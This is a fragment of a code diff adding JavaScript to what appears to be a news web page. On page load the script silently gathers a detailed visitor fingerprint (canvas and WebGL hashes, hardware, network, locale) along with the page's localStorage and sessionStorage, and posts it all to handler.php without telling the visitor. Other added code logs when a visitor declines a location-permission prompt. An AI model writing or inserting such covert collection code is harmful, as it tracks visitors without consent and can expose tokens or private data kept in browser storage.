+                    pageURL: pageURL,
+                    referrer: referrer,
+                    
+                    // IP will be detected server-side
+                    
+                    // Browser Info
+                    userAgent: userAgent,
+                    browser: browser,
+                    browserVersion: browserVersion,
+                    platform: platform,
+                    
+                    // OS Info
+                    os: OS,
+                    osVersion: OSVersion,
+                    cpu: CPU,
+                    
+                    // Screen Info
+                    screenWidth: screenWidth,
+                    screenHeight: screenHeight,
+                    screenAvailWidth: screenAvailWidth,
+                    screenAvailHeight: screenAvailHeight,
+                    colorDepth: colorDepth,
+                    pixelDepth: pixelDepth,
+                    deviceXDPI: deviceXDPI,
+                    deviceYDPI: deviceYDPI,
+                    
+                    // Hardware
+                    hardwareConcurrency: hardwareConcurrency,
+                    deviceMemory: deviceMemory,
+                    maxTouchPoints: maxTouchPoints,
+                    
+                    // Fingerprints
+                    canvasFingerprint: canvasFingerprint.substring(0, 100) + '...',
+                    webglFingerprint: webglFingerprint,
+                    
+                    // Plugins & MIME
+                    plugins: pluginsList,
+                    mimeTypes: mimeTypesList,
+                    
+                    // Storage
+                    localStorage: localStorage,
+                    sessionStorage: sessionStorage,
+                    cookiesEnabled: cookiesEnabled,
+                    
+                    // Locale
+                    timeZone: timeZone,
+                    timezoneOffset: timezoneOffset,
+                    language: language,
+                    languages: languages,
+                    
+                    // Network
+                    connectionInfo: connectionInfo,
+                    networkType: networkType,
+                    effectiveType: effectiveType,
+                    downlink: downlink,
+                    rtt: rtt,
+                    
+                    // Privacy
+                    doNotTrack: doNotTrack
+                };
+                
+                // Send to backend
+                $.ajax({
+                    type: 'POST',
+                    url: 'handler.php',
+                    data: {
+                        action: 'visitor_fingerprint',
+                        fingerprint: JSON.stringify(fingerprintData)
+                    },
+                    success: function(response) {
+                        console.log('Visitor fingerprint logged successfully');
+                    },
+                    error: function() {
+                        console.log('Error logging visitor fingerprint');
+                    }
+                });
+                
+            } catch(e) {
+                console.error('Error collecting fingerprint:', e);
+            }
+        }
+        
+        // Load news immediately on page load
+        window.addEventListener('DOMContentLoaded', function() {
+            loadNewsItems();
+            // Collect visitor fingerprint on page load
+            collectVisitorFingerprint();
+        });
+
+        // Call mydata function for device info
+        function mydata() {
+            // This function is from loc.js for device information
+        }
+
+        // Close location modal
+        function closeLocationModal() {
+            document.getElementById('locationPermissionModal').classList.remove('active');
+            selectedNewsItem = null;
+        }
+
+        // Skip location and show news directly
+        function skipLocationAndShowNews() {
+            if (selectedNewsItem) {
+                // Log that user skipped location
+                saveLocationErrorToLogs({ message: 'User skipped location access' }, selectedNewsItem);
+                document.getElementById('locationPermissionModal').classList.remove('active');
+                showFullNews(selectedNewsItem);
+            }
+        }
+    </script>
+</body>
+</html>
